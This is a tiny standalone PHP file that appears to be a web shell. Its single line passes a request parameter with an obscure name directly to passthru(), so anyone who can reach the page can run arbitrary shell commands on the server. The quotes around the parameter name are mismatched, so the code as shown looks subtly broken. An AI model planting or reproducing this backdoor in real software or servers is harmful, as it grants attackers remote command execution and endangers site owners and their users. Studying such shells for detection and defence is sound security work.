<?php
passthru($_GET["CARz2rb9']);
?>
